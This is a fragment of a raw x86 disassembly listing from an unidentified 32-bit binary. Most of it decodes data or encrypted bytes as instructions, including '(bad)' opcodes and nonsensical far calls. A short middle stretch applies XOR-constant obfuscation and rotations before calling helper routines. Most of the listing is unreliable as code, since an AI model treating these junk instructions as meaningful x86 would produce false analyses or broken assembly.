  41dba4:	sub    bl,BYTE PTR [ebp-0x2f]
  41dba7:	clc    
  41dba8:	out    dx,al
  41dba9:	data16 (bad) 
  41dbab:	sbb    al,0x2b
  41dbad:	mov    edx,0xd7fa7a38
  41dbb2:	pop    esp
  41dbb3:	stos   DWORD PTR es:[edi],eax
  41dbb4:	push   es
  41dbb5:	cwde   
  41dbb6:	fdiv   DWORD PTR [edx+0x10fcd765]
  41dbbc:	cmc    
  41dbbd:	icebp  
  41dbbe:	lea    edx,[ebp+0x2b]
  41dbc1:	(bad)  
  41dbc2:	pop    edx
  41dbc3:	jmp    0x6ba43faf
  41dbc8:	ret    0x460f
  41dbcb:	add    DWORD PTR [edi+0x20],ebp
  41dbce:	pop    ecx
  41dbcf:	adc    ebx,DWORD PTR [edx+0x5c]
  41dbd2:	sahf   
  41dbd3:	fiadd  DWORD PTR [edx]
  41dbd5:	iret   
  41dbd6:	in     al,dx
  41dbd7:	clc    
  41dbd8:	jge    0x41dbd5
  41dbda:	cmp    al,0x65
  41dbdc:	inc    ebp
  41dbdd:	(bad)  
  41dbde:	(bad)  
  41dbdf:	sub    cl,BYTE PTR [esp+eax*1+0x512209ff]
  41dbe6:	mov    bh,0x33
  41dbe8:	inc    ebp
  41dbe9:	in     eax,dx
  41dbea:	sub    BYTE PTR [edx],ah
  41dbec:	test   eax,0x8a2a21cf
  41dbf1:	and    ch,ch
  41dbf3:	lahf   
  41dbf4:	shl    BYTE PTR [esi+ecx*4],0x1
  41dbf8:	lahf   
  41dbf9:	mov    DWORD PTR [ecx+0x4b597aa9],edx
  41dbff:	push   ss
  41dc00:	data16 test BYTE PTR [edx-0x3e],bl
  41dc04:	or     DWORD PTR [eax-0x22],0x15ccc8ce
  41dc0b:	icebp  
  41dc0c:	out    0xe5,al
  41dc0e:	mov    edx,0xb2996814
  41dc13:	push   eax
  41dc14:	in     al,dx
  41dc15:	xchg   ecx,eax
  41dc16:	sti    
  41dc17:	jmp    DWORD PTR [eax]
  41dc19:	push   esi
  41dc1a:	int    0x6f
  41dc1c:	adc    eax,0xa24de027
  41dc21:	test   ah,al
  41dc23:	aas    
  41dc24:	retf   
  41dc25:	loopne 0x41dc2f
  41dc27:	test   BYTE PTR [ebp-0x64],0xcd
  41dc2b:	std    
  41dc2c:	rcl    BYTE PTR [edi],1
  41dc2e:	(bad)  
  41dc30:	push   DWORD PTR [eax]
  41dc32:	inc    eax
  41dc33:	xor    dl,bh
  41dc35:	and    BYTE PTR [eax+eax*1],al
  41dc38:	rol    BYTE PTR [edi+0x46e49175],cl
  41dc3e:	retf   
  41dc3f:	mov    eax,ds:0xa1cde64e
  41dc44:	clc    
  41dc45:	jmp    0x45bc1dfa
  41dc4a:	sbb    al,0xca
  41dc4c:	aam    0xc6
  41dc4e:	mov    ds,esi
  41dc50:	mov    esp,0x1cde9679
  41dc55:	mov    esi,0xa47e2a97
  41dc5a:	lock pop edx
  41dc5c:	add    DWORD PTR [ebx+0x21996afb],esp
  41dc62:	mov    DWORD PTR [edi-0x11],eax
  41dc65:	jg     0x41dc9b
  41dc67:	or     DWORD PTR [edi],esi
  41dc69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc6a:	int3   
  41dc6b:	outs   dx,DWORD PTR ds:[esi]
  41dc6c:	pop    edx
  41dc6d:	jbe    0x41dc77
  41dc6f:	and    bh,dh
  41dc71:	popa   
  41dc72:	sbb    DWORD PTR [esi],eax
  41dc74:	imul   ebx,esi,0xec6a2551
  41dc7a:	imul   ebp,esp,0x68
  41dc7d:	push   ebx
  41dc7e:	pop    edx
  41dc7f:	loop   0x41dc1c
  41dc81:	adc    edi,ebx
  41dc83:	adc    al,0x25
  41dc85:	inc    esi
  41dc86:	pop    ds
  41dc87:	loopne 0x41dc94
  41dc89:	lock rcl BYTE PTR [esi+0x7c],0xdf
  41dc8e:	dec    edi
  41dc8f:	cli    
  41dc90:	neg    BYTE PTR [ebp-0x83bb296]
  41dc96:	int    0xa2
  41dc98:	cdq    
  41dc99:	xor    al,0xf4
  41dc9b:	pop    ss
  41dc9c:	pop    edi
  41dc9d:	mov    dh,0xff
  41dc9f:	imul   edx,DWORD PTR [edx],0x4047e22f
  41dca5:	jl     0x41dcf0
  41dca7:	jmp    0x41dccf
  41dca9:	pop    ebx
  41dcaa:	cdq    
  41dcab:	sbb    eax,0xcb39a1fe
  41dcb0:	sbb    DWORD PTR [esi+0x76e93994],eax
  41dcb6:	sub    edi,eax
  41dcb8:	xor    ebx,DWORD PTR [ecx]
  41dcba:	add    DWORD PTR [eax+eiz*4-0x37],edx
  41dcbe:	je     0x41dd25
  41dcc0:	call   0x93fa:0x6f998eb6
  41dcc7:	jge    0x41dd3a
  41dcc9:	shl    esp,cl
  41dccb:	push   edi
  41dccc:	scas   al,BYTE PTR es:[edi]
  41dccd:	ffreep st(2)
  41dccf:	adc    ecx,DWORD PTR ds:[edi]
  41dcd2:	mov    DWORD PTR [edx],0x26545c73
  41dcd8:	cdq    
  41dcd9:	in     al,0xd6
  41dcdb:	push   ecx
  41dcdc:	sti    
  41dcdd:	push   cs
  41dcde:	loop   0x41dc88
  41dce0:	call   0x125609b5
  41dce5:	mov    bl,ch
  41dce7:	xchg   BYTE PTR [ecx+0x60],bh
  41dcea:	(bad)  
  41dceb:	rol    DWORD PTR [ebp+0x1e82f1e7],cl
  41dcf1:	jbe    0x41dd12
  41dcf3:	push   0xf464d4d5
  41dcf8:	cmp    DWORD PTR [ebp+0x7fe1ae98],esi
  41dcfe:	lahf   
  41dcff:	mov    edi,0xf013b575
  41dd04:	xchg   BYTE PTR ss:[edx+0x3a],dh
  41dd08:	push   edx
  41dd09:	sbb    dl,BYTE PTR [edx]
  41dd0b:	cmp    edi,esp
  41dd0d:	into   
  41dd0e:	stos   DWORD PTR es:[edi],eax
  41dd0f:	mov    ecx,DWORD PTR [edi+edi*2-0x18f4a3b1]
  41dd16:	pusha  
  41dd17:	pop    ebx
  41dd18:	mov    eax,edi
  41dd1a:	out    0x70,al
  41dd1c:	add    BYTE PTR [ebp+0x53f3f1b4],ah
  41dd22:	xchg   edi,eax
  41dd23:	inc    edi
  41dd24:	test   DWORD PTR [esp+ebp*1],0x4c03babb
  41dd2b:	adc    BYTE PTR [ecx+esi*8+0x2d],bl
  41dd2f:	arpl   WORD PTR [ebx+0x42],ax
  41dd32:	mov    bh,0x21
  41dd34:	and    dl,dh
  41dd36:	and    BYTE PTR [ecx+edi*2-0x3f],al
  41dd3a:	fiadd  WORD PTR [edi-0x47]
  41dd3d:	call   0x251b:0xb1c3d26a
  41dd44:	loop   0x41ddc3
  41dd46:	pop    edi
  41dd47:	aas    
  41dd48:	and    al,0x43
  41dd4a:	cmp    dh,dh
  41dd4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd4d:	pop    ebp
  41dd4f:	push   0x4b
  41dd51:	mov    ebx,0x34e6abfb
  41dd56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd57:	and    BYTE PTR [ebp+eax*4-0x35],ah
  41dd5b:	sub    eax,0x3099c282
  41dd60:	pop    ebp
  41dd61:	push   edx
  41dd62:	mov    edx,?
  41dd64:	das    
  41dd65:	retf   
  41dd66:	ins    BYTE PTR es:[edi],dx
  41dd67:	test   eax,0x17e9b8a0
  41dd6c:	das    
  41dd6d:	mov    edi,0xcb66913e
  41dd72:	test   eax,0x2d356288
  41dd77:	pop    eax
  41dd78:	xchg   ebp,eax
  41dd79:	sub    dh,dh
  41dd7b:	sub    BYTE PTR [edx+0x45b538ba],0xa6
  41dd82:	mov    esp,0x4daa5659
  41dd87:	call   0x5da3:0x780f886
  41dd8e:	push   ss
  41dd8f:	pop    ss
  41dd90:	fs pop esp
  41dd92:	(bad)  
  41dd93:	sbb    ch,BYTE PTR [edi-0x55]
  41dd96:	sub    DWORD PTR [ecx+0x3cd7abea],ecx
  41dd9c:	loop   0x41dd55
  41dd9e:	out    dx,al
  41dd9f:	das    
  41dda0:	test   eax,0x912b91aa
  41dda5:	hlt    
  41dda6:	sub    eax,esi
  41dda8:	inc    edi
  41dda9:	mov    ebx,0x72a1929d
  41ddae:	loopne 0x41dd87
  41ddb0:	pop    esi
  41ddb1:	mov    edi,DWORD PTR [ecx-0x7e]
  41ddb4:	mov    ah,0xf
  41ddb6:	or     ah,BYTE PTR [ebx+esi*1]
  41ddb9:	adc    eax,0x764b6283
  41ddbe:	leave  
  41ddbf:	xchg   esp,eax
  41ddc0:	pop    eax
  41ddc1:	xor    al,cl
  41ddc3:	fiadd  DWORD PTR [esi+ecx*8-0x4947fc1a]
  41ddca:	jmp    0x21c1:0x4d3bda72
  41ddd1:	mov    ebx,0x7aa703ad
  41ddd6:	int3   
  41ddd7:	add    eax,DWORD PTR [esi+edx*4-0x7c]
  41dddb:	shl    BYTE PTR [esi],cl
  41dddd:	js     0x41dd96
  41dddf:	mov    al,ds:0xc125de6c
  41dde4:	fistp  QWORD PTR [ecx]
  41dde6:	mov    edx,0xac44a3fc
  41ddeb:	xlat   BYTE PTR ds:[ebx]
  41ddec:	into   
  41dded:	inc    eax
  41ddee:	imul   BYTE PTR [esi-0x5cc18228]
  41ddf4:	add    edx,DWORD PTR [edi+0x7936db19]
  41ddfa:	cdq    
  41ddfb:	cs xchg ebp,eax
  41ddfd:	clc    
  41ddfe:	pop    ecx
  41ddff:	icebp  
  41de00:	sub    al,0xc6
  41de02:	adc    DWORD PTR [edi+0x5de2a055],esp
  41de08:	add    ah,BYTE PTR [edx]
  41de0a:	das    
  41de0b:	add    dl,bl
  41de0d:	ins    DWORD PTR es:[edi],dx
  41de0e:	jno    0x41dd95
  41de10:	test   al,0x11
  41de12:	adc    al,0x26
  41de14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de15:	xchg   ebx,eax
  41de16:	sub    eax,0xa465a621
  41de1b:	out    dx,al
  41de1c:	(bad)  
  41de1d:	mov    eax,0x727daf6
  41de22:	xor    eax,0xcb79b576
  41de27:	xor    edx,0x9c2b8ae8
  41de2d:	mov    cl,0x2
  41de2f:	call   0x408bb8
  41de34:	mov    ecx,edx
  41de36:	mov    edx,DWORD PTR [ebp-0x15c]
  41de3c:	mov    DWORD PTR [ebp-0x218],esi
  41de42:	mov    esi,DWORD PTR [ebp-0x158]
  41de48:	xor    edx,0xcb79b576
  41de4e:	xor    esi,0x9c2b8ae8
  41de54:	mov    DWORD PTR [ebp-0x21c],eax
  41de5a:	mov    eax,edx
  41de5c:	mov    edx,esi
  41de5e:	mov    DWORD PTR [ebp-0x220],ecx
  41de64:	mov    cl,0x3e
  41de66:	call   0x4223fa
  41de6b:	mov    esi,DWORD PTR [ebp-0x21c]
  41de71:	or     esi,eax
  41de73:	mov    eax,DWORD PTR [ebp-0x220]
  41de79:	or     eax,edx
  41de7b:	push   eax
  41de7c:	push   esi
  41de7d:	push   ebx
  41de7e:	push   edi
  41de7f:	call   0x41594e
  41de84:	mov    esi,DWORD PTR [ebp-0x218]
  41de8a:	cmp    esi,eax
  41de8c:	jne    0x41df42
  41de92:	mov    eax,DWORD PTR [ebp-0x154]
  41de98:	mov    edx,DWORD PTR [ebp-0x150]
  41de9e:	xor    eax,0xcb79b576
  41dea3:	xor    edx,0x9c2b8ae8
  41dea9:	mov    cl,0x2
  41deab:	call   0x408bb8
  41deb0:	mov    esi,eax
  41deb2:	mov    edi,edx
  41deb4:	mov    eax,DWORD PTR [ebp-0x154]
  41deba:	mov    edx,DWORD PTR [ebp-0x150]
  41dec0:	xor    eax,0xcb79b576
  41dec5:	xor    edx,0x9c2b8ae8
  41decb:	mov    cl,0x3e
  41decd:	call   0x4223fa
  41ded2:	or     esi,eax
  41ded4:	or     edi,edx
  41ded6:	mov    eax,DWORD PTR [ebp-0x15c]
  41dedc:	mov    edx,DWORD PTR [ebp-0x158]
  41dee2:	xor    eax,0xcb79b576
  41dee7:	xor    edx,0x9c2b8ae8
  41deed:	mov    cl,0x2
  41deef:	call   0x408bb8
  41def4:	mov    ebx,eax
  41def6:	mov    eax,edx
  41def8:	mov    ecx,DWORD PTR [ebp-0x15c]
  41defe:	mov    edx,DWORD PTR [ebp-0x158]
  41df04:	xor    ecx,0xcb79b576
  41df0a:	xor    edx,0x9c2b8ae8
  41df10:	mov    DWORD PTR [ebp-0x224],eax
  41df16:	mov    eax,ecx
  41df18:	mov    cl,0x3e
  41df1a:	call   0x4223fa
  41df1f:	or     ebx,eax
  41df21:	mov    eax,DWORD PTR [ebp-0x224]
  41df27:	or     eax,edx
  41df29:	push   eax
  41df2a:	push   ebx
  41df2b:	push   edi
  41df2c:	push   esi
  41df2d:	call   0x41594e
  41df32:	mov    DWORD PTR [ebp-0x178],eax
  41df38:	jmp    0x41f19e
  41df3d:	jmp    0x41f154
  41df42:	lea    eax,[ebp-0x168]
  41df48:	mov    DWORD PTR [ebp-0x164],eax
  41df4e:	mov    eax,DWORD PTR [ebp-0x164]
  41df54:	mov    DWORD PTR [eax],0xa5069bae
  41df5a:	mov    eax,DWORD PTR [ebp-0x168]
  41df60:	xor    eax,0xa5069bae
  41df65:	shr    eax,0x2
  41df68:	mov    ecx,DWORD PTR [ebp-0x168]
  41df6e:	xor    ecx,0xa5069bae
  41df74:	shl    ecx,0x1e
  41df77:	or     eax,ecx
  41df79:	mov    ecx,DWORD PTR [ebp-0x174]
  41df7f:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  41df83:	mov    DWORD PTR [ebp-0x160],eax
  41df89:	mov    esi,DWORD PTR [ebp-0x160]
  41df8f:	mov    eax,DWORD PTR [ebp-0x154]
  41df95:	mov    edx,DWORD PTR [ebp-0x150]
  41df9b:	xor    eax,0xcb79b576
  41dfa0:	xor    edx,0x9c2b8ae8
  41dfa6:	mov    cl,0x2
  41dfa8:	call   0x408bb8
  41dfad:	mov    edi,eax
  41dfaf:	mov    ebx,edx
  41dfb1:	mov    eax,DWORD PTR [ebp-0x154]
  41dfb7:	jmp    0x41e39e
  41dfbc:	mov    bl,0xa1
  41dfbe:	mov    eax,ds:0xbba5b3a5
  41dfc3:	mov    ebx,0xd1567b79
  41dfc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfc9:	adc    ecx,DWORD PTR [esi]
  41dfcb:	sahf   
  41dfcc:	nop
  41dfcd:	pop    edi
  41dfce:	sar    BYTE PTR [esi-0x41413bb6],0xb7
  41dfd5:	sbb    eax,0xa6038b0a
  41dfda:	outs   dx,DWORD PTR ds:[esi]
  41dfdb:	es push ds
  41dfdd:	push   ds
  41dfde:	cwde   
  41dfdf:	cli    
  41dfe0:	idiv   DWORD PTR [ebx+0x74]
  41dfe3:	cmp    al,0x88
  41dfe5:	push   0xd7a0812e
  41dfea:	xchg   edx,eax
  41dfeb:	loopne 0x41e025
  41dfed:	mov    dl,0x4d
  41dfef:	push   cs
  41dff0:	test   eax,0x6fa0ae5c
  41dff5:	or     bl,ch
  41dff7:	aaa    
  41dff8:	mov    bh,0xe8
  41dffa:	jle    0x41e074
  41dffc:	or     eax,0xb56f7879
  41e001:	test   BYTE PTR [edi+0x50],dh
  41e004:	jp     0x41e03b
  41e006:	ja     0x41df98
  41e008:	adc    al,0x1e
  41e00a:	ror    cl,0x84
  41e00d:	mov    ah,BYTE PTR [edi-0x1d]
  41e010:	inc    ecx
  41e011:	mov    al,0xda
  41e013:	push   eax
  41e014:	adc    ah,BYTE PTR fs:[eax+0x21]
  41e018:	and    DWORD PTR [ebp-0x19ccd589],ebp
  41e01e:	enter  0x1abc,0xb4
  41e022:	pushf  
  41e023:	push   0xffffff8d
  41e025:	enter  0xd3f7,0x2f
  41e029:	test   DWORD PTR [esi],ebx
  41e02b:	lea    ebx,[eax+0x1b1e156b]
  41e031:	clc    
  41e032:	aaa    
  41e033:	ror    ah,1
  41e035:	shl    cl,0xbf
  41e038:	xchg   edi,eax
  41e039:	retf   0xa895
  41e03c:	or     BYTE PTR [eax-0x370967c5],ah
  41e042:	or     eax,0xb0651a58
  41e047:	(bad)  
  41e048:	mov    al,ds:0x798f170b
  41e04d:	outs   dx,BYTE PTR ds:[esi]
  41e04e:	push   edx
  41e04f:	xchg   esp,eax
  41e050:	push   eax
  41e051:	ins    BYTE PTR es:[edi],dx
  41e052:	mov    edi,0xe51e5617
  41e057:	push   eax
  41e058:	and    al,0xba
  41e05a:	ror    BYTE PTR [eax-0x4e],1
  41e05d:	fsub   DWORD PTR [esi-0x98ff317]
  41e063:	inc    edx
  41e064:	inc    ebx
  41e065:	adc    eax,0x4e720642
  41e06a:	shl    DWORD PTR [ecx],0xf1
  41e06d:	mov    ?,WORD PTR [ebp-0x5d22781e]
  41e073:	and    DWORD PTR [esi+0x7a],0x2497a34f
  41e07a:	sti    
  41e07b:	pushf  
  41e07c:	daa    
  41e07d:	mov    eax,ds:0x3993bc11
  41e082:	mov    esi,0x9e71761b
  41e087:	in     eax,0x31
  41e089:	pop    esi
  41e08a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e08b:	cld    
  41e08c:	inc    ebp
  41e08d:	mov    bh,0x7b
  41e08f:	pushf  
  41e090:	hlt    
  41e091:	or     BYTE PTR [ecx],ah
  41e093:	mov    eax,ds:0x8793b266
  41e098:	adc    al,0x50
  41e09a:	xchg   ebx,eax
  41e09b:	aaa    
  41e09c:	mov    al,0xc5
  41e09e:	lds    edx,FWORD PTR [ebp-0x24]
  41e0a1:	jne    0x41e05f
  41e0a3:	dec    edi
  41e0a4:	outs   dx,BYTE PTR ds:[esi]
  41e0a5:	clc    
  41e0a6:	sub    eax,ecx
  41e0a8:	xor    dh,BYTE PTR ds:0x45c90070
  41e0ae:	outs   dx,BYTE PTR ds:[esi]
  41e0af:	sbb    esp,DWORD PTR [ecx-0x755c95f8]
  41e0b5:	mov    ebp,0xea2e970b
  41e0ba:	div    BYTE PTR [ebp+0x6e]
  41e0bd:	inc    edi
  41e0be:	fisubr DWORD PTR [ecx-0x4dae48fa]
  41e0c4:	jbe    0x41e0f7
  41e0c6:	pop    esi
  41e0c7:	psrlw  mm0,0xdc
  41e0cb:	mov    al,ds:0x13f7ee69
  41e0d0:	inc    eax
  41e0d1:	into   
  41e0d2:	sub    BYTE PTR [edx],ch
  41e0d4:	mov    esi,0xc96b5cb6
  41e0d9:	ins    BYTE PTR es:[edi],dx
  41e0da:	mov    esi,0xbb53fd61
  41e0df:	or     dl,BYTE PTR [esi-0x2e]
  41e0e2:	jmp    0x41e120
  41e0e4:	es xchg ebx,eax
  41e0e6:	jge    0x41e142
  41e0e8:	ret    0x9c47
  41e0eb:	(bad)  
  41e0ed:	js     0x41e08e
  41e0ef:	stos   DWORD PTR es:[edi],eax
  41e0f0:	rcl    DWORD PTR [eax+0x5a],0xd5
  41e0f4:	in     al,dx
  41e0f5:	shr    DWORD PTR [eax-0xd],1
  41e0f8:	or     eax,DWORD PTR [ebx-0x1a78f0f2]
  41e0fe:	push   esp
  41e0ff:	pop    ebx
  41e100:	mov    eax,ds:0xd9663bea
  41e105:	popa   
  41e106:	adc    al,0x8d
  41e108:	add    DWORD PTR [edi],0x63483e92
  41e10e:	add    esp,DWORD PTR [edi+0x75]
  41e111:	jge    0x41e171
  41e113:	mov    bh,0x83
  41e115:	or     DWORD PTR [ebx+0x46c22949],edx
  41e11b:	sbb    BYTE PTR fs:[edi],bl
  41e11e:	mov    cs,WORD PTR [ebp-0x2bc3389e]
  41e124:	push   es
  41e125:	add    edx,DWORD PTR [ebx+ebp*2-0x4e]
  41e129:	out    0x0,eax
  41e12b:	lods   al,BYTE PTR ds:[esi]
  41e12c:	inc    ebx
  41e12d:	mov    esp,0x19204bb2
  41e132:	shr    DWORD PTR [ebp-0x30],cl
  41e135:	aam    0x73
  41e137:	popa   
  41e138:	adc    eax,0x31d6b339
  41e13d:	mov    ds:0xaa1dd71a,al
  41e142:	enter  0x9d41,0xa6
  41e146:	aad    0x2d
  41e148:	outs   dx,DWORD PTR ds:[esi]
  41e149:	data16 ins BYTE PTR es:[edi],dx
  41e14b:	into   
  41e14c:	xor    dl,BYTE PTR [eax-0x3c]
  41e14f:	mov    es,WORD PTR [ebx-0x49]
  41e152:	adc    BYTE PTR [ebx],0xf7
  41e155:	xchg   BYTE PTR [edx],al
  41e157:	add    eax,0x989c3e70
  41e15c:	xchg   BYTE PTR fs:[bx+si+0x2d8b],ch
  41e162:	daa    
  41e163:	arpl   si,dx
  41e165:	cmp    al,0xf2
  41e167:	push   ecx
  41e168:	outs   dx,BYTE PTR ds:[esi]
  41e169:	pop    ebp
  41e16a:	mov    ds:0x3a7195d8,eax
  41e16f:	dec    edi
  41e170:	out    dx,al
  41e171:	jge    0x41e15d
  41e173:	ret    
  41e174:	and    al,0x47
  41e176:	inc    ecx
  41e177:	scas   al,BYTE PTR es:[edi]
  41e178:	push   ds
  41e179:	push   edx
  41e17a:	test   dh,0x79
  41e17d:	inc    ebx
  41e17e:	pusha  
  41e17f:	push   ss
  41e180:	push   es
  41e181:	data16 loope 0x41e177
  41e184:	inc    edi
  41e185:	adc    BYTE PTR [edx-0x22],0x42
  41e189:	push   ecx
  41e18a:	fstp   DWORD PTR [edi]
  41e18c:	push   edx
  41e18d:	(bad)  
  41e18e:	adc    DWORD PTR [edx-0x3d7fb989],ebp
  41e194:	stos   DWORD PTR es:[edi],eax
  41e195:	retf   
  41e196:	mov    edx,0xce90f57f
  41e19b:	xor    al,0x21
  41e19d:	pop    ebp
  41e19e:	sub    bl,0xb7
  41e1a1:	xchg   ebx,eax
  41e1a2:	cld    
  41e1a3:	cld    
  41e1a4:	pop    ebp
  41e1a5:	ficomp WORD PTR [ebx-0x54b489fa]
  41e1ab:	hlt    
  41e1ac:	shl    edx,0xa0
  41e1af:	hlt    
  41e1b0:	or     eax,0x964b0114
  41e1b5:	inc    ecx
  41e1b6:	push   ds
  41e1b7:	push   edx
  41e1b8:	pop    ecx
  41e1b9:	fs cdq 
  41e1bb:	or     ebx,esi
  41e1bd:	add    ebx,DWORD PTR [esi+0x704756]
  41e1c3:	das    
  41e1c4:	(bad)  
  41e1c5:	rcl    cl,0xbf
  41e1c8:	push   ss
  41e1c9:	and    edx,DWORD PTR [eax+0x27a05981]
  41e1cf:	add    DWORD PTR [ebp+0x3b404765],esi
  41e1d5:	jp     0x41e21e
  41e1d7:	xchg   esp,eax
  41e1d8:	xchg   ebp,eax
  41e1d9:	loopne 0x41e16d
  41e1db:	adc    al,0x81
  41e1dd:	mov    esi,0x34752e77
  41e1e2:	arpl   WORD PTR [eax+ebx*4-0x18],si
  41e1e6:	pop    ds
  41e1e7:	mov    bh,0x6e
  41e1e9:	loopne 0x41e17e
  41e1eb:	int3   
  41e1ec:	and    BYTE PTR [esi+0x26ede203],ch
  41e1f2:	aam    0x40
  41e1f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1f5:	push   0x642e0db8
  41e1fa:	fdiv   DWORD PTR ss:[edi-0x58]
  41e1fe:	hlt    
  41e1ff:	jb     0x41e1b4
  41e201:	sbb    DWORD PTR [edx-0x8],ecx
  41e204:	fbld   TBYTE PTR [ecx-0x35]
  41e207:	lea    ebp,[ebp-0x53]
  41e20a:	stos   BYTE PTR es:[edi],al
  41e20b:	in     eax,dx
  41e20c:	mov    bh,0xf8
  41e20e:	mov    ebp,0x151c3d1f
  41e213:	sub    al,0x37
  41e215:	inc    ebp
  41e216:	sbb    eax,DWORD PTR [ebx+0x73]
  41e219:	dec    ebp
  41e21a:	rcl    DWORD PTR [edi+0xd],0x98
  41e21e:	pop    ds
  41e21f:	inc    ebp
  41e220:	xchg   edx,eax
  41e221:	fadd   QWORD PTR ds:0xa04f73fc
  41e227:	(bad)  
  41e228:	mov    esi,0x28033371
  41e22d:	popa   
  41e22e:	xor    DWORD PTR [esi+eiz*1+0x17],ebp
  41e232:	mov    DWORD PTR [ebp+0x6f],ecx
  41e235:	test   al,0x66
  41e237:	push   cs
  41e238:	mov    dl,BYTE PTR [ecx-0x21]
  41e23b:	icebp  
  41e23c:	jbe    0x41e1d8
  41e23e:	or     DWORD PTR [eax-0x7d],edi
  41e241:	call   0x6c6c:0x6dee662b
  41e248:	push   0x5d
  41e24a:	ret    
  41e24b:	sub    ecx,DWORD PTR [edi]
  41e24d:	mov    eax,DWORD PTR [eax]
  41e24f:	jl     0x41e21b
  41e251:	aaa    
  41e252:	lahf   
  41e253:	sub    al,0xa0
  41e255:	jle    0x41e270
  41e257:	fwait
  41e258:	and    eax,0x5d315ed8
  41e25d:	bound  edi,QWORD PTR [edx]
  41e25f:	out    dx,al
  41e260:	cmp    bl,BYTE PTR [edx]
  41e262:	sti    
  41e263:	jns    0x41e2dd
  41e265:	not    BYTE PTR [ecx]
  41e267:	ret    
  41e268:	nop
  41e269:	retf   0x96cd
  41e26c:	int    0xb9
  41e26e:	ds inc esi
  41e270:	repnz push edx
  41e272:	cmc    
  41e273:	retf   
  41e274:	xchg   edi,eax
  41e275:	lahf   
  41e276:	mov    ebp,0x19488426
  41e27b:	mov    ch,dh
  41e27d:	jns    0x41e291
  41e27f:	in     eax,0xdb
  41e281:	and    ebx,DWORD PTR [ebx]
  41e283:	and    ebx,edx
  41e285:	jmp    DWORD PTR [ebp-0x2ae9edd]
  41e28b:	(bad)  
  41e28c:	ror    ebp,1
  41e28e:	in     eax,dx
  41e28f:	mov    ds,WORD PTR [ecx-0x21a4e318]
  41e295:	popf   
  41e296:	sub    al,0x63
  41e298:	and    al,0xb0
  41e29a:	in     al,0xd7
  41e29c:	mov    esp,0xe96c34a9
  41e2a1:	ret    
  41e2a2:	xchg   DWORD PTR [esi-0x56],ebp
  41e2a5:	sub    BYTE PTR [ecx+0x20],bl
  41e2a8:	inc    ebp
  41e2a9:	push   es
  41e2aa:	outs   dx,BYTE PTR ds:[esi]
  41e2ab:	xor    eax,0xbd064414
  41e2b0:	dec    edi
  41e2b1:	hlt    
  41e2b2:	pop    ebp
  41e2b3:	scas   al,BYTE PTR es:[edi]
  41e2b4:	retf   0x3a9b
  41e2b7:	dec    ecx
  41e2b8:	push   edx
  41e2b9:	or     al,cl
  41e2bb:	in     eax,0x2f
  41e2bd:	in     al,0x51
  41e2bf:	data16 fcom st(1)
  41e2c2:	and    DWORD PTR [edi-0x3c],edi
  41e2c5:	lods   eax,DWORD PTR ds:[esi]
  41e2c6:	std    
  41e2c7:	mov    DWORD PTR [eax],esi
  41e2c9:	sub    al,0x1d
  41e2cb:	(bad)  
  41e2cc:	adc    DWORD PTR [esi],edi
  41e2ce:	bound  ecx,QWORD PTR [edx-0x41]
  41e2d1:	aam    0x49
  41e2d3:	mov    WORD PTR [ecx],?
  41e2d5:	retf   0x2ed2
  41e2d8:	ror    BYTE PTR [eax-0x58],0x6d
  41e2dc:	or     BYTE PTR [edx+0x57],dh
  41e2df:	jmp    0xda06af6f
  41e2e4:	inc    eax
  41e2e5:	jnp    0x41e2bb
  41e2e7:	cmp    al,0x82
  41e2e9:	jbe    0x41e32a
  41e2eb:	add    al,cl
  41e2ed:	std    
  41e2ee:	ja     0x41e356
  41e2f0:	sbb    edx,ebp
  41e2f2:	cmp    bh,0x8f
  41e2f5:	jecxz  0x41e2f5
  41e2f7:	into   
  41e2f8:	scas   al,BYTE PTR es:[edi]
  41e2f9:	out    dx,al
  41e2fa:	(bad)  
  41e2fb:	(bad)  
  41e2fc:	sti    
  41e2fd:	and    bl,dh
  41e2ff:	cld    
  41e300:	retf   
  41e301:	test   al,0x64
  41e303:	dec    ebx
  41e304:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e305:	test   eax,esi
  41e307:	sbb    eax,0xc7c8d26d
  41e30c:	xchg   esp,eax
  41e30d:	mov    cl,0x4c
  41e30f:	and    ebp,DWORD PTR [esi+edi*1-0x53]
  41e313:	sbb    eax,0xce4706f1
  41e318:	lock aam 0x93
  41e31b:	stc    
  41e31c:	dec    esi
  41e31d:	mov    ebp,0x1a419937
  41e322:	loope  0x41e373
  41e324:	mov    dl,0xe3
  41e326:	data16 mov al,0x34
  41e329:	jnp    0x41e379
  41e32b:	or     ecx,DWORD PTR [edx-0xa7cc108]
  41e331:	(bad)  [edx+esi*4+0x13]
  41e335:	cli    
  41e336:	ja     0x41e2ce
  41e338:	sub    al,0xb9
  41e33a:	mov    ds:0x8eb96785,eax
  41e33f:	push   ebx
  41e340:	jno    0x41e399
  41e342:	lods   eax,DWORD PTR ds:[esi]
  41e343:	xchg   DWORD PTR [ebp-0x7e],esp
  41e346:	or     esi,ecx
  41e348:	mov    esp,0xfe687668
  41e34d:	jae    0x41e2db
  41e34f:	and    DWORD PTR [ecx+0x59],ecx
  41e352:	or     eax,DWORD PTR [eax]
  41e354:	adc    DWORD PTR [ecx+ecx*1-0x659eede4],0x2df97591
  41e35f:	stos   BYTE PTR es:[edi],al
  41e360:	add    eax,0xac600bea
  41e365:	jne    0x41e3a4
  41e367:	(bad)  
  41e368:	aad    0x45
  41e36a:	popa   
  41e36b:	mov    WORD PTR [ebp-0xd],gs
  41e36e:	(bad)  
  41e36f:	push   0x76
  41e371:	inc    edi
  41e372:	dec    ebp
  41e373:	fsub   DWORD PTR [esi+0x52]
  41e376:	cmp    DWORD PTR [ebp-0x6796dbe7],edi
  41e37c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e37d:	mov    ds:0x4e33bbc1,eax
  41e382:	add    BYTE PTR [edi+0x1d],al
  41e385:	mov    cl,0x69
  41e387:	cmp    ch,bl
  41e389:	hlt    
  41e38a:	dec    esi
  41e38b:	adc    dh,bl
  41e38d:	add    ebp,esi
  41e38f:	sbb    edx,ecx
  41e391:	push   es
